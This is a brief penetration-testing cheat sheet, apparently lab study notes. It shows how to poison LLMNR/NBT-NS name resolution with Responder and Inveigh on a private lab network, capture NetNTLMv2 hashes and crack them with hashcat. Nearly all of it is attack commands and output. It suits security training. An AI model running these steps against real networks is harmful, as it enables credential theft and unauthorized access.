# Linux
Identifying the the target
```
ip a
```
Attack interface: ens224 (target network: 172.16.5.225/23)
```
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:d0:cf brd ff:ff:ff:ff:ff:ff
    altname enp19s0
    inet 172.16.5.225/23 brd 172.16.5.255 scope global noprefixroute ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::32e6:baa0:e3aa:25da/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```
Starts listening on target network to capture hashes
```
sudo responder -I ens224 
```
Mode 5600: NetNTLMv2 specific for Responder
```
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.tx
```

# Windows
## 1
Configuring the system
```
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

Explotation
```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
## 2
Explotation
```
.\Inveigh.exe
```
Press ESC
```
GET NTLMV2UNIQUE
```

Mode 5600: NetNTLMv2 specific for Responder
```
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.tx
```
